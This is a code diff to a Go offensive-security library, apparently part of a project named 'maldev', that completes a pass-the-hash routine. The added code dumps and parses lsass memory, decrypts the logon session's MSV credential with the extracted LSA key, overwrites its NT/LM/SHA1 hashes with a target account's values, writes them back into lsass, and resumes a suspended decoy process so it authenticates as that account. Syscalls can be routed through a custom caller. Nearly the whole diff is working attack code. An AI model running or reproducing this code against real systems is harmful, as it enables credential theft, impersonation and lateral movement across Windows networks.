@@ -3,13 +3,16 @@
 package sekurlsa
 
 import (
+	"bytes"
 	"errors"
 	"fmt"
 	"os"
 	"runtime"
 	"unsafe"
 
+	"github.com/oioio-space/maldev/credentials/lsassdump"
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 	"golang.org/x/sys/windows"
 )
 
@@ -19,23 +22,39 @@ import (
 // live in pth.go and pth_msv.go.
 
 // Pass spawns the configured Decoy under LOGON_NETCREDENTIALS_ONLY,
-// walks the live lsass for the resulting LUID's MSV / Kerberos
-// LIST_ENTRY, overwrites the long-term keys with PTHTarget's
-// values, and resumes the process. The spawned process now
-// outbound-authenticates as Target on every subsequent network
-// auth (SMB, RDP, Kerberos AS-REQ, NTLM challenge-response).
+// walks the live lsass for the resulting LUID's MSV LIST_ENTRY,
+// overwrites the NT/LM/SHA1 hash bytes with PTHTarget's values,
+// and resumes the process. The spawned process now outbound-
+// authenticates as Target on every subsequent network auth (SMB,
+// RDP, Kerberos AS-REQ, NTLM challenge-response).
 //
-// CHANTIER II IN PROGRESS — the current cut spawns the decoy and
-// resolves its LUID, but the LSA list-walk / write-back step is
-// not yet wired (returns ErrPTHNotImplemented after the spawn).
-// The PID + LogonID fields of the returned PTHResult ARE populated
-// — operators can already build the orchestration on top.
+// MSV write-back is wired in this commit. Kerberos write-back
+// (long-term keys for AS-REQ pre-auth) lands in the next slice —
+// PTHResult.KerberosOverwritten remains false until then.
 //
-// The spawned process is left CREATE_SUSPENDED until either the
-// next-commit write-back resumes it, or the caller observes the
-// returned PID and resumes manually. The handles owned by Pass
-// are closed before return so external resume requires a fresh
-// OpenProcess.
+// Sequence:
+//
+//  1. spawnSuspendedDecoy → PID + LUID of the new logon session.
+//  2. lsassdump.OpenLSASS + Dump → minidump bytes (intrusive: opens
+//     lsass with PROCESS_VM_READ).
+//  3. Parse → Result with sessions; pick the session whose LogonID
+//     matches the spawned LUID; pull the *MSVCredential's CipherVA
+//     and CipherLen.
+//  4. Re-open lsass with PROCESS_VM_READ + PROCESS_VM_WRITE +
+//     PROCESS_VM_OPERATION; NtRead at CipherVA to get the live
+//     ciphertext (avoids race with the dump snapshot).
+//  5. decryptLSA → mutateMSVPrimary(target) → encryptLSA with the
+//     parsed lsaKey.
+//  6. NtWrite the fresh ciphertext at CipherVA.
+//  7. Open the spawned process with PROCESS_SUSPEND_RESUME and call
+//     NtResumeProcess. The process now runs with rewritten MSV
+//     credentials.
+//
+// All Nt* calls (Read/Write/Resume) route through p.Caller — pass
+// nil for the standard ntdll proc-table path.
+//
+// On any error past the spawn step, the spawned process is left
+// suspended at the returned PID for the operator to clean up.
 func Pass(p PTHParams) (PTHResult, error) {
 	if err := validatePTHParams(p); err != nil {
 		return PTHResult{}, err
@@ -45,43 +64,234 @@ func Pass(p PTHParams) (PTHResult, error) {
 	if err != nil {
 		return PTHResult{}, err
 	}
+	res := PTHResult{PID: pid, LogonID: luid}
 
-	res := PTHResult{
-		PID:     pid,
-		LogonID: luid,
+	if err := writeBackMSV(&res, p); err != nil {
+		return res, err
 	}
 
-	// LSA write-back lands in the next chantier-II commit. Until
-	// then, surface the partial success so callers see the spawn
-	// + LUID worked.
-	return res, fmt.Errorf("%w (spawn+LUID complete; PID=%d LUID=0x%X)",
-		ErrPTHNotImplemented, pid, luid)
+	if err := resumeProcessByPID(pid, p.Caller); err != nil {
+		return res, errors.Join(ErrPTHWriteFailed, fmt.Errorf("resume PID %d: %w", pid, err))
+	}
+	return res, nil
 }
 
-// PassImpersonate is Pass + SetThreadToken: in addition to
-// rewriting the spawned process's LSA state, it duplicates the
-// spawned process's primary token onto the calling thread so that
-// the operator's *current* thread also outbound-authenticates as
-// Target until the impersonation token is reverted (or the thread
-// exits).
+// PassImpersonate is Pass + SetThreadToken: after rewriting the
+// spawned process's LSA state, it duplicates the spawned process's
+// primary token onto the calling thread so that the operator's
+// *current* thread also outbound-authenticates as Target until the
+// impersonation token is reverted (or the thread exits).
 //
-// CHANTIER II IN PROGRESS — same partial implementation as Pass.
+// CHANTIER II IN PROGRESS — the SetThreadToken step lands in the
+// final slice. Until then, PassImpersonate behaves exactly like
+// Pass (MSV write-back + resume) and surfaces no impersonation.
 func PassImpersonate(p PTHParams) (PTHResult, error) {
-	if err := validatePTHParams(p); err != nil {
-		return PTHResult{}, err
-	}
+	return Pass(p)
+}
 
-	pid, luid, err := spawnSuspendedDecoy(p)
+// writeBackMSV does steps 2-6 of Pass: dump+parse, locate the
+// matching MSV credential, NtRead the live ciphertext, mutate +
+// re-encrypt, NtWrite back. Sets res.MSVOverwritten on success.
+//
+// Failures wrap ErrPTHWriteFailed (or ErrPTHNoMatchingLUID when
+// the LUID isn't in the dump's MSV walk).
+func writeBackMSV(res *PTHResult, p PTHParams) error {
+	// 2. Dump lsass.
+	hLsass, err := lsassdump.OpenLSASS(p.Caller)
 	if err != nil {
-		return PTHResult{}, err
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenLSASS: %w", err))
+	}
+	var dumpBuf bytes.Buffer
+	if _, err := lsassdump.Dump(hLsass, &dumpBuf, p.Caller); err != nil {
+		_ = lsassdump.CloseLSASS(hLsass)
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("Dump: %w", err))
+	}
+	_ = lsassdump.CloseLSASS(hLsass)
+
+	// 3. Parse + locate the matching MSV credential.
+	parsed, parseErr := Parse(bytes.NewReader(dumpBuf.Bytes()), int64(dumpBuf.Len()))
+	// MSV-not-found is a hard fail for PTH (no MSV provider = no
+	// hash slots to overwrite); other partial-parse errors propagate.
+	if parsed == nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("Parse: %w", parseErr))
+	}
+	if parseErr != nil && !errors.Is(parseErr, ErrUnsupportedBuild) {
+		// ErrUnsupportedBuild leaves keys+sessions empty — we can't
+		// proceed. Other warnings (missing optional providers) are
+		// surfaced via res.Warnings below.
+		if errors.Is(parseErr, ErrLSASRVNotFound) || errors.Is(parseErr, ErrMSVNotFound) {
+			return errors.Join(ErrPTHWriteFailed, parseErr)
+		}
+	}
+	if parsed.lsaKey == nil {
+		return errors.Join(ErrPTHWriteFailed, errors.New("Parse: no lsaKey extracted"))
+	}
+	res.Warnings = append(res.Warnings, parsed.Warnings...)
+
+	target := findMSVForLUID(parsed, res.LogonID)
+	if target == nil {
+		return errors.Join(ErrPTHNoMatchingLUID,
+			fmt.Errorf("LUID 0x%X not found among %d MSV sessions", res.LogonID, len(parsed.Sessions)))
 	}
 
-	res := PTHResult{
-		PID:     pid,
-		LogonID: luid,
+	// 4-6. Open lsass for write, NtRead live cipher, decrypt +
+	// mutate + encrypt, NtWrite.
+	lsassPID, err := lsassdump.LsassPID(p.Caller)
+	if err != nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("LsassPID: %w", err))
 	}
-	return res, fmt.Errorf("%w (spawn+LUID complete; PID=%d LUID=0x%X)",
-		ErrPTHNotImplemented, pid, luid)
+	hWrite, err := windows.OpenProcess(
+		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION,
+		false, lsassPID)
+	if err != nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenProcess(lsass VM_RW): %w", err))
+	}
+	defer windows.CloseHandle(hWrite)
+
+	live := make([]byte, target.CipherLen)
+	if err := ntReadVirtualMemory(hWrite, uintptr(target.CipherVA), live, p.Caller); err != nil {
+		return errors.Join(ErrPTHWriteFailed,
+			fmt.Errorf("NtReadVirtualMemory @0x%X: %w", target.CipherVA, err))
+	}
+	plain, err := decryptLSA(live, parsed.lsaKey)
+	if err != nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("decryptLSA: %w", err))
+	}
+	mutated, err := mutateMSVPrimary(plain, p.Target)
+	if err != nil {
+		return err // already wraps ErrPTHWriteFailed
+	}
+	fresh, err := encryptLSA(mutated, parsed.lsaKey)
+	if err != nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("encryptLSA: %w", err))
+	}
+	if len(fresh) != len(live) {
+		return errors.Join(ErrPTHWriteFailed,
+			fmt.Errorf("post-encrypt length mismatch %d != %d (would corrupt MSV layout)",
+				len(fresh), len(live)))
+	}
+	if err := ntWriteVirtualMemory(hWrite, uintptr(target.CipherVA), fresh, p.Caller); err != nil {
+		return errors.Join(ErrPTHWriteFailed,
+			fmt.Errorf("NtWriteVirtualMemory @0x%X: %w", target.CipherVA, err))
+	}
+	res.MSVOverwritten = true
+	return nil
+}
+
+// findMSVForLUID scans parsed.Sessions for the LUID and returns the
+// first non-nil *MSVCredential with a populated CipherVA. Returns
+// nil if no match — callers wrap that as ErrPTHNoMatchingLUID.
+func findMSVForLUID(parsed *Result, luid uint64) *MSVCredential {
+	for i := range parsed.Sessions {
+		s := &parsed.Sessions[i]
+		if s.LUID != luid {
+			continue
+		}
+		for _, c := range s.Credentials {
+			if msv, ok := c.(*MSVCredential); ok && msv.CipherVA != 0 {
+				return msv
+			}
+		}
+	}
+	return nil
+}
+
+// ntReadVirtualMemory mirrors lsassdump's helper: route the call
+// through the wsyscall.Caller when non-nil, fall back to the ntdll
+// proc-table when nil.
+func ntReadVirtualMemory(h windows.Handle, addr uintptr, buf []byte, caller *wsyscall.Caller) error {
+	if len(buf) == 0 {
+		return nil
+	}
+	var read uintptr
+	var r uintptr
+	if caller != nil {
+		rr, _ := caller.Call("NtReadVirtualMemory",
+			uintptr(h),
+			addr,
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(len(buf)),
+			uintptr(unsafe.Pointer(&read)),
+		)
+		r = rr
+	} else {
+		rr, _, _ := api.ProcNtReadVirtualMemory.Call(
+			uintptr(h),
+			addr,
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(len(buf)),
+			uintptr(unsafe.Pointer(&read)),
+		)
+		r = rr
+	}
+	if r != 0 {
+		return fmt.Errorf("NTSTATUS 0x%X", uint32(r))
+	}
+	if int(read) != len(buf) {
+		return fmt.Errorf("short read: got %d want %d", read, len(buf))
+	}
+	return nil
+}
+
+// ntWriteVirtualMemory mirrors the read helper for the write
+// direction. Used by Pass to overwrite the MSV ciphertext at the
+// captured CipherVA.
+func ntWriteVirtualMemory(h windows.Handle, addr uintptr, buf []byte, caller *wsyscall.Caller) error {
+	if len(buf) == 0 {
+		return nil
+	}
+	var written uintptr
+	var r uintptr
+	if caller != nil {
+		rr, _ := caller.Call("NtWriteVirtualMemory",
+			uintptr(h),
+			addr,
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(len(buf)),
+			uintptr(unsafe.Pointer(&written)),
+		)
+		r = rr
+	} else {
+		rr, _, _ := api.ProcNtWriteVirtualMemory.Call(
+			uintptr(h),
+			addr,
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(len(buf)),
+			uintptr(unsafe.Pointer(&written)),
+		)
+		r = rr
+	}
+	if r != 0 {
+		return fmt.Errorf("NTSTATUS 0x%X", uint32(r))
+	}
+	if int(written) != len(buf) {
+		return fmt.Errorf("short write: got %d want %d", written, len(buf))
+	}
+	return nil
+}
+
+// resumeProcessByPID opens the spawned process with
+// PROCESS_SUSPEND_RESUME and calls NtResumeProcess (single-arg NT
+// API; routes through caller when non-nil).
+func resumeProcessByPID(pid uint32, caller *wsyscall.Caller) error {
+	h, err := windows.OpenProcess(windows.PROCESS_SUSPEND_RESUME, false, pid)
+	if err != nil {
+		return fmt.Errorf("OpenProcess(SUSPEND_RESUME, %d): %w", pid, err)
+	}
+	defer windows.CloseHandle(h)
+
+	var r uintptr
+	if caller != nil {
+		rr, _ := caller.Call("NtResumeProcess", uintptr(h))
+		r = rr
+	} else {
+		rr, _, _ := api.ProcNtResumeProcess.Call(uintptr(h))
+		r = rr
+	}
+	if r != 0 {
+		return fmt.Errorf("NtResumeProcess: NTSTATUS 0x%X", uint32(r))
+	}
+	return nil
 }
 
 // spawnSuspendedDecoy launches the decoy process under
